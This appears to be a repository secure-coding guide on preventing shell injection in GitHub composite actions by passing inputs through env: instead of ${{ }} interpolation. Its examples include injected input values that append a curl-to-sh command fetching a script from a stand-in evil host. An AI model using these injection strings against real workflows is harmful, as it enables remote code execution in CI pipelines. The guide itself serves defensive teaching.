# Action Input Security: `env:` over interpolation

Composite actions in this repo run `run:` steps in bash. There is one
load-bearing rule that every such action must follow:

> **Route every `with:` input that reaches a `run:` step through `env:`, never
> through `${{ }}` interpolation into the script body.**

An input passed by interpolation is parsed by bash as **code**. An input passed
by `env:` is **data**. The difference is the whole game.

This is not a style preference. `update-flatpak-index/action.yml` was written
after callers were able to execute arbitrary shell through a `with:` input, and
the comment that introduced the fix explains why. Everything below is the
general principle that fix encodes.

---

## The vulnerability

GitHub substitutes `${{ inputs.foo }}` into the action's YAML **text** before
the runner writes the script to disk and hands it to bash. The value is spliced
into the script *before* bash parses it, so whatever the caller passed becomes
part of the shell syntax itself.

A caller can therefore inject shell:

```yaml
# UNSAFE
- shell: bash
  run: |
    python3 update-index.py --tags ${{ inputs.tags }}
```

```yaml
# caller
- uses: tuna-os/.github/.github/actions/update-flatpak-index@main
  with:
    tags: latest; curl -fsS https://evil.example/p.sh | sh
```

After substitution the script bash sees is:

```sh
python3 update-index.py --tags latest; curl -fsS https://evil.example/p.sh | sh
```

The injected `;` is a real command separator. Every caller of the action now
has code execution. Any `with:` input that is later handed to a shell is a
remote-code-execution primitive until it is routed through `env:`.

---

## The pattern — make inputs data, not code

Put the input on the step's `env:` block and read it back as a shell variable.
The expression is still substituted into the text, but it now lands inside a
variable *assignment*, which bash expands only as a string — it is never
re-parsed as syntax.

```yaml
# SAFE
- shell: bash
  env:
    TAGS: ${{ inputs.tags }}
  run: |
    python3 update-index.py --tags "${TAGS}"
```

Now `${TAGS}` is expanded by bash *after* parsing. The value
`latest; curl -fsS https://evil.example/p.sh | sh` is a single literal
argument to `--tags`; the `;`, `|`, and spaces are data, not operators.

This is the pattern in `update-flatpak-index/action.yml`:

```yaml
env:
  ACTION_PATH: ${{ github.action_path }}
  OCI_DIR: ${{ inputs.oci-dir }}
  INDEX_FILE: ${{ inputs.index-file }}
  REPO_NAME: ${{ inputs.repo-name }}
  TAGS: ${{ inputs.tags }}
  ...
run: |
  python3 "$ACTION_PATH/update-index.py" \
    --oci-dir "$OCI_DIR" \
    --tags "${tag_args[@]}"
```

Every input travels as an environment variable and is consumed quoted.

---

## Why quoting narrows but does not close the hole

The tempting fix is to quote the interpolated expression instead of dropping
it:

```yaml
run: |
  python3 update-index.py --tags "${{ inputs.tags }}"
```

This narrows the attack but does not close it. The `${{ }}` is substituted
first, so a value containing a `"` closes the author's quote and the text that
follows becomes code:

```yaml
# caller
with:
  tags: latest" && curl -fsS https://evil.example/p.sh | sh   # "
```

After substitution bash sees:

```sh
python3 update-index.py --tags "latest" && curl -fsS https://evil.example/p.sh | sh
```

The author's opening quote terminated at the injected `"`, and the `&&` chain
runs. Quoting the interpolation only protects against values that happen not to
contain a quote character; it is defense that a single `"` defeats. The value
must not be in a position bash parses as code at all — which is exactly what
`env:` gives you.

---

## Multi-value case: `read -ra`, not unquoted word-splitting

A space-separated list (tags, paths) needs to become several arguments. The
naive move is to leave the variable unquoted so bash word-splits it:

```yaml
run: |
  python3 update-index.py --tags $TAGS      # UNSAFE
```

Unquoted `$TAGS` is still wrong for two reasons:

- **Word splitting is not injection, but globbing is.** Bash does not re-parse
  `;` or `|` inside an expanded variable, but it *does* pathname-expand `*`,
  `?`, and `[...]`. A value of `*.txt` expands to the filenames in the working
  directory and silently corrupts the argument list — the same class of bug as
  injection, just without the shell operators.
- **A value that should be one argument breaks apart.** `repo-name` with a
  space becomes two arguments.

Split the value into an array with `read -ra`, then expand the array quoted.
`read` splits on whitespace as pure data (no globbing) and the quoted array
expansion keeps each element intact:

```yaml
# SAFE — update-flatpak-index/action.yml
run: |
  set -euo pipefail
  read -ra tag_args <<<"$TAGS"
  if [ "${#tag_args[@]}" -eq 0 ]; then
    echo "::error::tags input is empty" >&2
    exit 1
  fi
  python3 "$ACTION_PATH/update-index.py" \
    --tags "${tag_args[@]}"
```

`read -ra` reads the env var as one string and splits it into `tag_args`;
`"${tag_args[@]}"` passes each element as its own quoted argument. Whitespace
splitting without glob expansion — the multi-value case handled correctly.

---

## Validate the grammar

`env:` stops injection; validation turns a malformed input into a clear error
rather than a subtle wrong-argument bug. `update-flatpak-index` validates each
tag against its grammar before use:

```bash
for tag in "${tag_args[@]}"; do
  if ! [[ "$tag" =~ ^[A-Za-z0-9_][A-Za-z0-9._-]{0,127}$ ]]; then
    echo "::error::invalid OCI tag: $tag" >&2
    exit 1
  fi
done
```

State the expected grammar (character class + length) and reject anything that
does not match. It is defense in depth on top of the `env:` rule, not a
substitute for it.

---

## Secrets are inputs too

A secret routed by interpolation is executable code — worse, because it is
usually the thing you are trying to keep secret. `publish-flatpak-index`
receives `FLATPAK_INDEX_TOKEN` through `env:` and treats it as data:

```yaml
env:
  FLATPAK_INDEX_TOKEN: ${{ inputs.token }}
```

and then takes care that the value never leaves the process as data it should
not:

- **Header-based git auth**, so the token never lands in `.git/config`,
  `git remote -v`, or process arguments:
  ```sh
  auth_header="AUTHORIZATION: basic $(echo -n "x-access-token:$FLATPAK_INDEX_TOKEN" | base64 -w0)"
  git -C "$INDEX_REPO" config --local http.extraheader "$auth_header"
  ```
- **`GIT_TERMINAL_PROMPT=0`** so a missing/invalid token fails fast instead of
  pausing the step waiting for interactive input.
- **A permission probe before use** — it checks `permissions.push` against the
  API and exits rather than attempting a push with a token that cannot push.

Rule of thumb: a secret through `env:` is data; a secret interpolated into a
`run:` body is code. Never interpolate a secret.

---

## When to apply

Apply the rule whenever **both** are true:

1. the action exposes a `with:` input, **and**
2. that input is passed to a `run:` step as an argument to a shell command.

If the string reaches a shell as an argument, it must come through `env:`, not
`${{ }}`.

Interpolation is fine where the value is **not** consumed by a shell:

- `with:` on a `uses:` step (the downstream action reads it as its own input),
- `if:` conditions,
- `file:` / `upload` / `download` inputs.

`ste-lint/action.yml` is the mixed case worth memorizing: `node-version` stays
on the `uses:` line (interpolation is correct there), while the values the
step actually runs — `budget-file`, `budget`, `base-ref`, `annotations` — go
through `env:`:

```yaml
- uses: actions/setup-node@949feb2...
  with:
    node-version: ${{ inputs.node-version }}   # safe: read by the action, not a shell

- shell: bash
  env:
    BUDGET_FILE: ${{ inputs.budget-file }}
    BUDGET_INPUT: ${{ inputs.budget }}
    BASE_REF: ${{ inputs.base-ref }}
    ANNOTATIONS: ${{ inputs.annotations }}
  run: |
    node "$GITHUB_ACTION_PATH/ste-lint.mjs" --summary
```

Heuristic: if you find yourself quoting an `${{ }}` expression inside a `run:`
body, that is the signal to move it to `env:`.

---

## Checklist

- [ ] Every `with:` input used inside a `run:` step is exposed via `env:`, not interpolated.
- [ ] Multi-value inputs are split with `read -ra` (or equivalent) and expanded as `"${arr[@]}"` — never unquoted.
- [ ] Values are validated against an expected grammar.
- [ ] Secrets are routed through `env:` and never interpolated, written to a file, or passed as command arguments.
- [ ] No quoted `${{ }}` interpolation survives inside any `run:` body.

---

## References

- [`actions/update-flatpak-index/action.yml`](actions/update-flatpak-index) — the
  canonical `env:` + `read -ra` + validate pattern, with the rationale comment
  that introduced it.
- [`actions/publish-flatpak-index/action.yml`](actions/publish-flatpak-index) —
  secret handling: `env:` delivery, header-based git auth, `GIT_TERMINAL_PROMPT=0`,
  pre-use permission probe.
- [`actions/ste-lint/action.yml`](actions/ste-lint) — the mixed case: interpolation
  on `uses:` is safe; runtime arguments go through `env:`.
